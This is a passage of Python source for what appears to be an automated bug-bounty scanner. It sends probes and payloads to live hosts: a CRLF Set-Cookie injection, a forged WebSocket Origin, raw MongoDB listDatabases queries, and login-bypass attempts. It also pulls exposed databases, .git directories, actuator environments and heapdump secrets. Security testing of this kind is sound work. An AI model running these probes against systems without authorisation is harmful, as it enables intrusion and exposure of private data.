        if _shannon_entropy(value) > 4.0:
            entropy_hits.append(key_name)

    if not keyword_hits and not entropy_hits:
        return None

    findings_summary = ", ".join(sorted(keyword_hits | set(entropy_hits))[:8])
    return {
        "vuln_type": "leaked_source_map",
        "severity": "high",
        "evidence": (
            f"{map_url} is publicly exposed and reconstructs to original source "
            f"containing likely secrets: {findings_summary}. Original bundle: {js_url}"
        ),
    }


# ---------------------------------------------------------------------
# 7. Open redirect
# ---------------------------------------------------------------------
_REDIRECT_PARAM_PATTERN = re.compile(
    r"^(url|redirect|redirect_uri|redirect_url|return|return_url|returnto|"
    r"return_to|next|dest|destination|continue|r|redir|target|out|forward)$",
    re.IGNORECASE,
)
_OPEN_REDIRECT_PROBE = "https://swas-redirect-probe.example.com"


async def check_open_redirect(url: str) -> dict | None:
    """
    If `url` has a parameter whose name looks redirect-related, replaces
    its value with an external probe domain and checks whether the
    server issues an HTTP redirect straight to it without validation.
    Does not follow the redirect (follow_redirects=False) - we only need
    to see the Location header the server itself generated.
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    redirect_param = next(
        (p for p in query_params if _REDIRECT_PARAM_PATTERN.match(p)), None
    )
    if redirect_param is None:
        return None

    mutated = _replace_query_param(parsed, query_params, redirect_param, _OPEN_REDIRECT_PROBE)
    logger.info("detective: checking open redirect for %s", mutated)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
            resp = await client.get(mutated)
    except httpx.HTTPError as exc:
        logger.info("detective: open redirect check failed for %s: %s", mutated, exc)
        return None

    location = resp.headers.get("location", "")
    if resp.status_code in (301, 302, 303, 307, 308) and _OPEN_REDIRECT_PROBE in location:
        return {
            "vuln_type": "open_redirect",
            "severity": "low",
            "evidence": (
                f"{url} param '{redirect_param}' causes an unvalidated HTTP "
                f"{resp.status_code} redirect straight to an attacker-controlled "
                f"domain: Location: {location}"
            ),
        }
    return None


# ---------------------------------------------------------------------
# 8. CSP weakness analysis (recon-only - see module docstring)
# ---------------------------------------------------------------------
_WEAK_CSP_PATTERN = re.compile(r"unsafe-inline|unsafe-eval|\*", re.IGNORECASE)


async def check_csp_weakness(url: str) -> str | None:
    """
    Reads the Content-Security-Policy header and returns a short
    human-readable note if script-src/default-src looks loose enough to
    make XSS payloads more likely to execute. Returns a plain string (or
    None), NOT a findings dict - this is intentionally never saved to
    the findings table. A weak CSP alone is not a vulnerability a
    program pays for; it's context for where to spend dalfox/manual XSS
    effort. See the module docstring for why.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            resp = await client.get(url)
    except httpx.HTTPError:
        return None

    csp = resp.headers.get("content-security-policy", "")
    if not csp:
        return f"{url}: no CSP header set - XSS payloads face no CSP restriction here"

    directives = [d.strip() for d in csp.split(";") if d.strip()]
    weak = [d for d in directives if _WEAK_CSP_PATTERN.search(d)]
    if weak:
        return f"{url}: weak CSP directive(s): {'; '.join(weak[:3])}"
    return None


# ---------------------------------------------------------------------
# 9. GraphQL introspection mapper
# ---------------------------------------------------------------------
_GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/graphql/console"]
_INTROSPECTION_QUERY = {
    "query": "{__schema{queryType{name} mutationType{name} types{name kind fields{name}}}}"
}


async def check_graphql_introspection(host: str) -> dict | None:
    """
    Tries a short list of common GraphQL endpoint paths under `host`. If
    introspection is enabled (the server just answers a __schema query
    with no auth), pulls back the full type/field list - this routinely
    surfaces mutation names and internal fields that were never meant to
    be discoverable, which is genuinely useful attack-surface mapping
    even though the introspection response itself is the finding here
    rather than a direct exploit.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
            for path in _GRAPHQL_PATHS:
                url = base + path
                logger.info("detective: checking GraphQL introspection for %s", url)
                try:
                    resp = await client.post(url, json=_INTROSPECTION_QUERY)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                try:
                    data = resp.json()
                except ValueError:
                    continue

                schema = (data.get("data") or {}).get("__schema")
                if not schema or not schema.get("types"):
                    continue

                type_names = [t["name"] for t in schema["types"] if t.get("name")][:10]
                mutation_type = (schema.get("mutationType") or {}).get("name")
                return {
                    "vuln_type": "graphql_introspection_exposed",
                    "severity": "medium",
                    "evidence": (
                        f"{url} allows unauthenticated GraphQL introspection - "
                        f"{len(schema['types'])} types exposed, including: "
                        f"{', '.join(type_names)}"
                        + (f". Mutation root: {mutation_type}" if mutation_type else "")
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: GraphQL introspection check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 10. Exposed Firebase database
# ---------------------------------------------------------------------
_FIREBASE_URL_PATTERN = re.compile(
    r"https?://([a-z0-9\-]+)\.firebaseio\.com", re.IGNORECASE
)


async def check_firebase_exposure(js_url: str) -> dict | None:
    """
    Downloads a JS bundle looking for a hardcoded Firebase databaseURL
    (a routine finding - Firebase config is client-side by design). The
    actual check is whether that database allows anonymous reads: if
    appending /.json to the databaseURL returns real data instead of
    `null` or a permission-denied error, the whole dataset is public.
    """
    if not js_url.lower().split("?")[0].endswith(".js"):
        return None

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            resp = await client.get(js_url)
    except httpx.HTTPError as exc:
        logger.info("detective: firebase check fetch failed for %s: %s", js_url, exc)
        return None

    if resp.status_code != 200:
        return None

    matches = set(_FIREBASE_URL_PATTERN.findall(resp.text))
    if not matches:
        return None

    logger.info(
        "detective: checking Firebase exposure for %d project(s) found in %s",
        len(matches), js_url,
    )
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
            for project in list(matches)[:2]:
                db_url = f"https://{project}.firebaseio.com/.json"
                try:
                    db_resp = await client.get(db_url)
                except httpx.HTTPError:
                    continue
                body = db_resp.text.strip()
                if db_resp.status_code == 200 and body and body != "null":
                    preview = body[:200].replace("\n", " ")
                    return {
                        "vuln_type": "exposed_firebase_database",
                        "severity": "critical",
                        "evidence": (
                            f"Firebase project '{project}' (found in {js_url}) allows "
                            f"anonymous reads at {db_url}. Data preview: {preview}..."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: firebase DB check failed: %s", exc)
    return None


# ---------------------------------------------------------------------
# 11. Exposed Docker/Kubernetes control API
# ---------------------------------------------------------------------
# (port, kind, path) - default ports for each service's unauthenticated
# API. A short connect timeout matters a lot here: most hosts simply
# don't have these ports open, and we don't want that (expected, common)
# case to slow down the pipeline while it waits on a dead connection.
_CONTAINER_API_TARGETS = [
    (2375, "docker", "/version", "http"),
    (2376, "docker", "/version", "https"),
    (10250, "kubelet", "/pods", "https"),
    (10255, "kubelet", "/pods", "http"),
]
_CONTAINER_PROBE_TIMEOUT = httpx.Timeout(4.0, connect=2.5)


async def check_exposed_container_api(host: str) -> dict | None:
    """
    Probes the default Docker daemon and Kubernetes kubelet ports for
    an unauthenticated control API. A live match here is about as
    critical as findings get - full container/pod control with zero
    auth - so this is intentionally conservative: it only fires on a
    response shape that's essentially impossible to get by accident
    (ApiVersion field for Docker, items array for kubelet).
    """
    hostname = _extract_hostname(host)
    if hostname is None:
        return None

    try:
        async with httpx.AsyncClient(timeout=_CONTAINER_PROBE_TIMEOUT, verify=False) as client:
            for port, kind, path, scheme in _CONTAINER_API_TARGETS:
                url = f"{scheme}://{hostname}:{port}{path}"
                try:
                    resp = await client.get(url)
                except httpx.HTTPError:
                    continue  # port closed/filtered/refused - the overwhelmingly common case

                if resp.status_code != 200:
                    continue

                if kind == "docker" and '"ApiVersion"' in resp.text:
                    return {
                        "vuln_type": "exposed_docker_api",
                        "severity": "critical",
                        "evidence": (
                            f"{url} responds with a live Docker daemon API version string - "
                            f"unauthenticated Docker control endpoint exposed."
                        ),
                    }
                if kind == "kubelet" and '"items"' in resp.text:
                    return {
                        "vuln_type": "exposed_kubelet_api",
                        "severity": "critical",
                        "evidence": (
                            f"{url} responds with a live pod listing - "
                            f"unauthenticated kubelet API exposed."
                        ),
                    }
    except Exception as exc:  # noqa: BLE001 - this check touches raw sockets on
        # arbitrary ports across many hosts; a narrow except here would miss
        # legitimate low-level connection failures that httpx doesn't always
        # wrap as httpx.HTTPError (e.g. some TLS/socket edge cases)
        logger.info("detective: container API check failed for %s: %s", hostname, exc)
    return None


# ---------------------------------------------------------------------
# 12. Exposed .git directory
# ---------------------------------------------------------------------

async def check_git_exposure(host: str) -> dict | None:
    """
    Checks whether `host` publicly serves its .git/HEAD file - the
    single most reliable, lowest-cost signal that a deployed app's full
    .git directory (and with it, complete source history) is exposed.
    Full source reconstruction from an exposed .git directory (walking
    the object store, rebuilding the tree) is a meaningfully bigger task
    than this single check - this function only confirms exposure exists
    so you know where reconstruction effort is worth spending.
    """
    url = host.rstrip("/") + "/.git/HEAD"
    logger.info("detective: checking git exposure for %s", url)
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: git exposure check failed for %s: %s", url, exc)
        return None

    body = resp.text.strip()
    if resp.status_code == 200 and body.startswith("ref:"):
        return {
            "vuln_type": "exposed_git_directory",
            "severity": "high",
            "evidence": (
                f"{url} is publicly accessible and returns a valid git HEAD reference "
                f"({body[:100]}) - the full .git directory (source history, and "
                f"potentially hardcoded secrets in old commits) is exposed."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 13. Exposed Elasticsearch index
# ---------------------------------------------------------------------

async def check_elasticsearch_exposure(host: str) -> dict | None:
    """
    Elasticsearch's default config (still common in the wild) binds to
    0.0.0.0:9200 with zero authentication. _cat/indices?format=json is
    the single cheapest confirmation - a real Elasticsearch cluster with
    no auth returns the full index catalog to anyone who asks.
    """
    hostname = _extract_hostname(host)
    if hostname is None:
        return None

    url = f"http://{hostname}:9200/_cat/indices?format=json"
    logger.info("detective: checking Elasticsearch exposure for %s", url)
    try:
        async with httpx.AsyncClient(timeout=_CONTAINER_PROBE_TIMEOUT, verify=False) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: Elasticsearch check failed for %s: %s", url, exc)
        return None

    if resp.status_code != 200:
        return None
    try:
        data = resp.json()
    except ValueError:
        return None

    if isinstance(data, list) and data and all(isinstance(d, dict) and "index" in d for d in data[:1]):
        index_names = [d.get("index") for d in data][:10]
        return {
            "vuln_type": "exposed_elasticsearch",
            "severity": "critical",
            "evidence": (
                f"{url} returns {len(data)} index name(s) with zero authentication: "
                f"{', '.join(str(n) for n in index_names)}"
            ),
        }
    return None


# ---------------------------------------------------------------------
# 14. Exposed Prometheus / Spring Actuator metrics
# ---------------------------------------------------------------------
_ACTUATOR_PATHS = ["/actuator/env", "/actuator", "/actuator/prometheus", "/metrics"]


async def check_actuator_exposure(host: str) -> dict | None:
    """
    /actuator/env on an exposed Spring Boot app dumps the entire runtime
    configuration - property sources, env vars, sometimes connection
    strings - which is why it's checked first and treated as the more
    severe case. The other actuator/metrics paths are checked too but
    scored lower, since a bare metrics dump alone is a weaker finding
    unless it happens to contain secret-shaped values (reusing the same
    entropy/keyword detection as check_file_entropy).
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            for path in _ACTUATOR_PATHS:
                url = base + path
                logger.info("detective: checking actuator/metrics exposure for %s", url)
                try:
                    resp = await client.get(url)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text

                if path == "/actuator/env" and '"propertySources"' in body:
                    keyword_hits = set(_SECRET_KEYWORD_PATTERN.findall(body))
                    entropy_hits = {
                        m.group(1) for m in _TOKEN_PATTERN.finditer(body)
                        if _shannon_entropy(m.group(2)) > 4.0
                    }
                    all_hits = keyword_hits | entropy_hits
                    severity = "critical" if all_hits else "high"
                    hits_note = (
                        f" Includes secret-shaped values: {', '.join(sorted(all_hits)[:5])}."
                        if all_hits else ""
                    )
                    return {
                        "vuln_type": "exposed_spring_actuator_env",
                        "severity": severity,
                        "evidence": (
                            f"{url} exposes the full Spring Boot runtime environment "
                            f"(config, property sources) with no authentication.{hits_note}"
                        ),
                    }

                if path in ("/actuator", "/actuator/prometheus", "/metrics") and (
                    '"_links"' in body or body.startswith("# HELP") or body.startswith("# TYPE")
                ):
                    return {
                        "vuln_type": "exposed_actuator_metrics",
                        "severity": "medium",
                        "evidence": (
                            f"{url} exposes application metrics/actuator endpoints with no "
                            f"authentication - review the raw output manually for anything sensitive."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: actuator check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 15. Exposed NoSQL database port (CouchDB, MongoDB)
# ---------------------------------------------------------------------

async def _check_couchdb_exposure(hostname: str) -> dict | None:
    url = f"http://{hostname}:5984/_all_dbs"
    logger.info("detective: checking CouchDB exposure for %s", url)
    try:
        async with httpx.AsyncClient(timeout=_CONTAINER_PROBE_TIMEOUT, verify=False) as client:
            resp = await client.get(url)
    except httpx.HTTPError:
        return None
    if resp.status_code != 200:
        return None
    try:
        data = resp.json()
    except ValueError:
        return None
    if isinstance(data, list):
        return {
            "vuln_type": "exposed_couchdb",
            "severity": "critical",
            "evidence": f"{url} returns the full database list with zero authentication: {data[:10]}",
        }
    return None


def _bson_int32_command(field_name: str) -> bytes:
    """Hand-encodes a minimal single-field BSON document like
    {field_name: 1} - just enough BSON to speak MongoDB's wire protocol
    for one specific command, without pulling in a BSON library."""
    name_bytes = field_name.encode() + b"\x00"
    body = b"\x10" + name_bytes + (1).to_bytes(4, "little")
    doc = body + b"\x00"
    return (len(doc) + 4).to_bytes(4, "little") + doc


def _mongo_op_query(collection: str, bson_doc: bytes) -> bytes:
    """Wraps a BSON command document in a MongoDB OP_QUERY wire message
    (opCode 2004) targeting `collection` (e.g. 'admin.$cmd')."""
    coll_bytes = collection.encode() + b"\x00"
    body = (
        (1).to_bytes(4, "little")       # requestID
        + (0).to_bytes(4, "little")     # responseTo
        + (2004).to_bytes(4, "little")  # opCode: OP_QUERY
        + (0).to_bytes(4, "little")     # flags
        + coll_bytes
        + (0).to_bytes(4, "little")     # numberToSkip
        + (1).to_bytes(4, "little", signed=True)  # numberToReturn
        + bson_doc
    )
    return (len(body) + 4).to_bytes(4, "little") + body


async def _check_mongodb_exposure(hostname: str) -> dict | None:
    """
    Sends a raw, hand-encoded listDatabases command over MongoDB's wire
    protocol with no credentials. isMaster is deliberately NOT used as
    the signal here - MongoDB always answers isMaster pre-auth by design
    (it's part of the driver handshake), so a successful isMaster proves
    nothing about whether auth is actually required. listDatabases does
    require auth on a properly configured instance, so a real database
    list coming back with no error is the actual signal.

    This is a best-effort, defensively-wrapped check: any parsing
    failure or unexpected response just returns None rather than
    raising, since a hand-rolled wire-protocol client is inherently more
    fragile than an HTTP-based check.
    """
    port = 27017
    logger.info("detective: checking MongoDB exposure for %s:%d", hostname, port)
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, port), timeout=3.0
        )
    except (OSError, asyncio.TimeoutError):
        return None

    try:
        cmd_doc = _bson_int32_command("listDatabases")
        message = _mongo_op_query("admin.$cmd", cmd_doc)
        writer.write(message)
        await writer.drain()

        raw_len = await asyncio.wait_for(reader.readexactly(4), timeout=3.0)
        total_len = int.from_bytes(raw_len, "little")
        if total_len <= 4 or total_len > 65536:
            return None
        rest = await asyncio.wait_for(reader.readexactly(total_len - 4), timeout=3.0)
        response = raw_len + rest

        looks_unauthenticated = (
            b"databases" in response
            and b"not authorized" not in response
            and b"requires authentication" not in response
            and b"errmsg" not in response
        )
        if looks_unauthenticated:
            return {
                "vuln_type": "exposed_mongodb",
                "severity": "critical",
                "evidence": (
                    f"{hostname}:{port} answers an unauthenticated listDatabases command - "
                    f"MongoDB instance has no authentication enabled. Verify manually with "
                    f"'mongosh --host {hostname} --eval \"db.adminCommand({{listDatabases:1}})\"' "
                    f"before reporting, since this check uses a hand-rolled wire-protocol client."
                ),
            }
    except (OSError, asyncio.TimeoutError, asyncio.IncompleteReadError):
        return None
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:  # noqa: BLE001 - best-effort cleanup, never let this raise
            pass
    return None


async def check_nosql_db_exposure(host: str) -> dict | None:
    """Tries CouchDB (HTTP-based, straightforward) then MongoDB
    (raw wire-protocol, best-effort) against `host`'s default ports."""
    hostname = _extract_hostname(host)
    if hostname is None:
        return None

    couch_result = await _check_couchdb_exposure(hostname)
    if couch_result is not None:
        return couch_result
    return await _check_mongodb_exposure(hostname)


# ---------------------------------------------------------------------
# 16. Swagger / OpenAPI doc parser
# ---------------------------------------------------------------------
_SWAGGER_PATHS = [
    "/swagger.json", "/openapi.json", "/v2/api-docs", "/v3/api-docs",
    "/swagger/v1/swagger.json",
]
_SENSITIVE_API_PATH_HINTS = re.compile(
    r"admin|internal|debug|manage|actuator|private|staff|superuser|backdoor",
    re.IGNORECASE,
)


async def check_swagger_exposure(host: str) -> dict | None:
    """
    Probes common Swagger/OpenAPI spec paths. A live spec by itself is
    routinely low-value/Informative (most programs expect API docs to
    be somewhat public) - so this only files a finding when the spec
    itself lists admin/internal-looking paths, meaning the documentation
    is revealing functionality that arguably shouldn't be discoverable
    at all, not just documenting an already-public API.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            for path in _SWAGGER_PATHS:
                url = base + path
                logger.info("detective: checking Swagger/OpenAPI exposure for %s", url)
                try:
                    resp = await client.get(url)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                try:
                    spec = resp.json()
                except ValueError:
                    continue

                paths = spec.get("paths") if isinstance(spec, dict) else None
                if not isinstance(paths, dict) or not paths:
                    continue

                sensitive_paths = [p for p in paths if _SENSITIVE_API_PATH_HINTS.search(p)][:10]
                if not sensitive_paths:
                    continue  # a plain public API spec alone isn't worth filing

                return {
                    "vuln_type": "exposed_api_documentation",
                    "severity": "medium",
                    "evidence": (
                        f"{url} is a publicly accessible API spec ({len(paths)} total paths) "
                        f"including admin/internal-looking endpoints with no visible auth "
                        f"requirement documented: {', '.join(sensitive_paths)}"
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: Swagger exposure check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 17. WAF/honeypot fingerprinting (recon-only - see module docstring)
# ---------------------------------------------------------------------
_WAF_SIGNATURES: dict[str, list[str]] = {
    "cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
    "akamai": ["akamai", "ak_bmsc"],
    "imperva": ["incap_ses", "visid_incap", "x-iinfo"],
    "sucuri": ["x-sucuri-id", "sucuri"],
}


async def check_waf_fingerprint(host: str) -> str | None:
    """
    Identifies common WAF/CDN signatures in response headers and a small
    body sample. Returns a plain string (or None), NOT a findings dict -
    same reasoning as check_csp_weakness: which WAF fronts a target is
    not itself a vulnerability, it's context. Concretely, it exists so a
    human (or a future check) can tell "this odd response is just the
    WAF's block page" apart from "the application actually behaved this
    way" - without it, WAF block pages risk getting misread as real
    findings by less careful heuristics.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            resp = await client.get(host)
    except httpx.HTTPError:
        return None

    header_blob = " ".join(f"{k}:{v}" for k, v in resp.headers.items()).lower()
    body_sample = resp.text[:2000].lower()
    for waf_name, signatures in _WAF_SIGNATURES.items():
        if any(sig in header_blob or sig in body_sample for sig in signatures):
            return f"{host}: WAF/CDN detected - {waf_name}"
    return None


# ---------------------------------------------------------------------
# 18. Exposed heapdump
# ---------------------------------------------------------------------
_HEAPDUMP_PATHS = ["/actuator/heapdump", "/heapdump", "/heapdump.json"]
# Heapdumps can be multi-gigabyte files. We only need enough of the
# start to catch secret-shaped strings without pulling the whole thing -
# Java stores strings inline in the heap, so plaintext credentials near
# the start are common when they exist at all. This is a real coverage
# tradeoff (secrets further into the dump will be missed), not a
# complete secret scan.
_HEAPDUMP_MAX_BYTES = 500_000


_HPROF_MAGIC = b"JAVA PROFILE"  # real HPROF files start "JAVA PROFILE 1.0.x\0"


async def check_heapdump_exposure(host: str) -> dict | None:
    """
    Checks common heapdump paths and, if one is publicly served, samples
    the first _HEAPDUMP_MAX_BYTES bytes and reuses the same secret
    keyword/entropy detection as check_actuator_exposure. Only reports
    when actual secret-shaped values are found in that sample - a bare
    "heapdump file exists" without visible secrets in the sampled portion
    isn't reported here (consistent with how check_source_map_leak and
    check_swagger_exposure are calibrated elsewhere in this file).

    Redirects are NOT followed here on purpose. A 301/302 away from the
    heapdump path means the path doesn't actually serve a heapdump -
    it's a redirect to a login page, SPA catch-all, or custom error page.
    Previously follow_redirects=True meant those landing pages got
    fetched, and if the landing page happened to contain any
    secret-shaped string (a token in a JS bundle, the word "password" in
    a form, etc.) this fired a false "critical" finding - the reporter
    manually re-checks the same URL and sees a plain redirect instead.
    We also require the real HPROF binary signature before trusting
    keyword/entropy hits, since that's the one thing a false-positive
    landing page can't fake.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
            for path in _HEAPDUMP_PATHS:
                url = base + path
                logger.info("detective: checking heapdump exposure for %s", url)
                chunk = b""
                try:
                    async with client.stream("GET", url) as resp:
                        if resp.status_code != 200:
                            # includes 3xx redirects - not a real exposure
                            continue
                        async for data in resp.aiter_bytes():
                            chunk += data
                            if len(chunk) >= _HEAPDUMP_MAX_BYTES:
                                break
                except httpx.HTTPError:
                    continue

                if len(chunk) < 1000:
                    continue  # too small to be a real heapdump - likely a 404/error page

                if _HPROF_MAGIC not in chunk[:64]:
                    # Doesn't look like an actual Java heap dump - skip,
                    # even if it superficially resembles secret-shaped text.
                    continue

                # Heapdumps are binary, but Java stores strings as
                # contiguous readable runs - lenient latin-1 decode lets
                # the existing regex-based detectors work against it.
                text_sample = chunk.decode("latin-1", errors="ignore")
                keyword_hits = set(_SECRET_KEYWORD_PATTERN.findall(text_sample))
                entropy_hits = {
                    m.group(1) for m in _TOKEN_PATTERN.finditer(text_sample)
                    if _shannon_entropy(m.group(2)) > 4.0
                }
                all_hits = keyword_hits | entropy_hits
                if not all_hits:
                    continue

                return {
                    "vuln_type": "exposed_heapdump",
                    "severity": "critical",
                    "evidence": (
                        f"{url} serves a heapdump file. Secret-shaped values found in the "
                        f"first {len(chunk)} bytes sampled: {', '.join(sorted(all_hits)[:5])}. "
                        f"Note: only a small prefix of the file was analyzed - the full dump "
                        f"likely contains more."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: heapdump check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 19. CRLF / HTTP response-splitting
# ---------------------------------------------------------------------
_CRLF_MARKER = "swas_crlf_probe"
_CRLF_PAYLOAD = f"test%0d%0aSet-Cookie:%20{_CRLF_MARKER}=1"


def _inject_raw_query_param(url: str, param: str, raw_value: str) -> str:
    """
    Like _replace_query_param, but inserts `raw_value` into the query
    string verbatim instead of running it through urlencode(). This
    matters specifically for CRLF payloads: urlencode() would re-encode
    our already-percent-encoded %0d%0a into %250d%250a, which never
    reaches the server as an actual CR/LF once it decodes the URL - the
    payload would just silently stop working.
    """
    parsed = urlparse(url)
    parts = parsed.query.split("&") if parsed.query else []
    new_parts, replaced = [], False
    for part in parts:
        key = part.split("=", 1)[0]
        if key == param:
            new_parts.append(f"{param}={raw_value}")
            replaced = True
        else:
            new_parts.append(part)
    if not replaced:
        new_parts.append(f"{param}={raw_value}")
    return urlunparse(parsed._replace(query="&".join(new_parts)))


async def check_crlf_injection(url: str) -> dict | None:
    """
    Injects a CRLF sequence + a marker Set-Cookie into each of the
    first 2 query parameters on `url`. The only thing that counts as
    confirmation is the marker actually showing up in the RAW response
    headers httpx parsed back out - meaning the server split our input
    into a real second header line, not just reflected a literal
    newline character somewhere in the response body (which has no
    security impact and isn't CRLF injection).
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return None

    param_names = list(query_params.keys())[:2]
    logger.info("detective: checking CRLF injection for %s", url)
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
            for param in param_names:
                mutated = _inject_raw_query_param(url, param, _CRLF_PAYLOAD)
                try:
                    resp = await client.get(mutated)
                except httpx.HTTPError:
                    continue

                injected = any(_CRLF_MARKER in v for v in resp.headers.values())
                if injected:
                    return {
                        "vuln_type": "crlf_injection",
                        "severity": "medium",
                        "evidence": (
                            f"{url} param '{param}': injecting a CRLF sequence produced a forged "
                            f"'{_CRLF_MARKER}' header/cookie in the raw response - confirmed HTTP "
                            f"response splitting, not just a reflected newline in the body."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: CRLF injection check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 20. WebSocket hijacking (CSWSH)
# ---------------------------------------------------------------------
_WEBSOCKET_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
_WS_PROBE_PATHS = ["/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket"]
_CSWSH_ATTACKER_ORIGIN = "https://swas-cswsh-probe.example.com"


def _ws_accept_key(sec_websocket_key: str) -> str:
    """RFC 6455's Sec-WebSocket-Accept algorithm: SHA1(key + magic GUID),
    base64-encoded. Used to confirm a 101 response is a genuine completed
    WebSocket handshake, not some unrelated server that happens to
    return HTTP 101 for other reasons."""
    digest = hashlib.sha1((sec_websocket_key + _WEBSOCKET_GUID).encode()).digest()
    return base64.b64encode(digest).decode()


async def _try_ws_handshake(hostname: str, port: int, path: str, use_tls: bool) -> bool:
    """
    Hand-rolls a raw WebSocket opening handshake (it's just one HTTP
    Upgrade request - no need for a websockets library to test only the
    handshake, and this keeps detective.py dependency-free like the rest
    of the module). Sends an attacker-controlled Origin header; returns
    True only if the server completes a byte-verified handshake anyway
    (101 status AND the correct Sec-WebSocket-Accept value for the key
    we sent - not just any 101 response).
    """
    sec_key = base64.b64encode(os.urandom(16)).decode()
    expected_accept = _ws_accept_key(sec_key)

    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {sec_key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Origin: {_CSWSH_ATTACKER_ORIGIN}\r\n"
        f"\r\n"
    ).encode()

    ssl_context = None
    if use_tls:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, port, ssl=ssl_context), timeout=4.0
        )
    except (OSError, asyncio.TimeoutError, ssl.SSLError):
        return False

    try:
        writer.write(request)
        await writer.drain()
        try:
            response = await asyncio.wait_for(reader.read(4096), timeout=4.0)
        except asyncio.TimeoutError:
            return False
        response_text = response.decode(errors="ignore")
        status_line = response_text.split("\r\n", 1)[0]
        if " 101 " not in f" {status_line} ":
            return False
        return expected_accept.lower() in response_text.lower()
    except (OSError, asyncio.TimeoutError):
        return False
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:  # noqa: BLE001 - best-effort cleanup, never let this raise
            pass


async def check_websocket_cswsh(host: str) -> dict | None:
    """
    Tries a short list of common WebSocket paths under `host`. If any
    completes a full, byte-verified handshake despite an attacker
    Origin, that's evidence the server doesn't validate Origin on this
    endpoint. Deliberately scored medium (not high/critical) with an
    explicit caveat in the evidence: CSWSH only matters if the socket
    carries authenticated/session data via cookies, which we can't
    confirm without a real logged-in session (no test accounts
    available yet - see the multi-token IDOR discussion). Reporting this
    as-is against a public/anonymous WebSocket feed would likely come
    back Informative.
    """
    hostname = _extract_hostname(host)
    if hostname is None:
        return None

    use_tls = not host.lower().startswith("http://")
    port = 443 if use_tls else 80

    for path in _WS_PROBE_PATHS:
        scheme = "wss" if use_tls else "ws"
        logger.info("detective: checking WebSocket CSWSH for %s://%s%s", scheme, hostname, path)
        accepted = await _try_ws_handshake(hostname, port, path, use_tls)
        if accepted:
            return {
                "vuln_type": "websocket_origin_not_validated",
                "severity": "medium",
                "evidence": (
                    f"{scheme}://{hostname}{path} completed a full WebSocket handshake despite "
                    f"an attacker-controlled Origin header ({_CSWSH_ATTACKER_ORIGIN}). This only "
                    f"has real impact if the endpoint carries session/authenticated data via "
                    f"cookies - verify that manually before reporting, since CSWSH on a public/"
                    f"anonymous feed is routinely triaged as Informative."
                ),
            }
    return None


# ---------------------------------------------------------------------
# 21 & 22 share candidate paths and a confirmation pattern: send a
# baseline request with garbage credentials (expected to fail, no
# session), then a payload request (NoSQL operator or type-confused
# value), and only confirm a bypass if the payload response looks
# authenticated in a way the baseline didn't - a new session cookie
# AND a success-shaped status where the baseline had neither. Neither
# check trusts status code alone, since plenty of apps return 200 with
# an error body.
# ---------------------------------------------------------------------
_LOGIN_CANDIDATE_PATHS = ["/api/login", "/login", "/api/auth/login", "/api/session", "/signin", "/api/signin"]
_LOGIN_FIELD_COMBOS = [("username", "password"), ("email", "password")]


async def _check_login_bypass(
    client: httpx.AsyncClient, url: str, user_field: str, pass_field: str, payload_body: dict
) -> dict | None:
    """
    Shared confirmation logic for both the NoSQL injection and JSON
    type confusion checks below. Returns a dict with 'baseline_status',
    'payload_status', and 'bypassed' (bool) - the caller fills in its
    own vuln_type/evidence wording since the two checks describe
    different techniques even though the confirmation logic is
    identical.
    """
    baseline_body = {user_field: "swas-probe-nonexistent-user", pass_field: "swas-probe-wrong-password"}
    try:
        baseline_resp = await client.post(url, json=baseline_body)
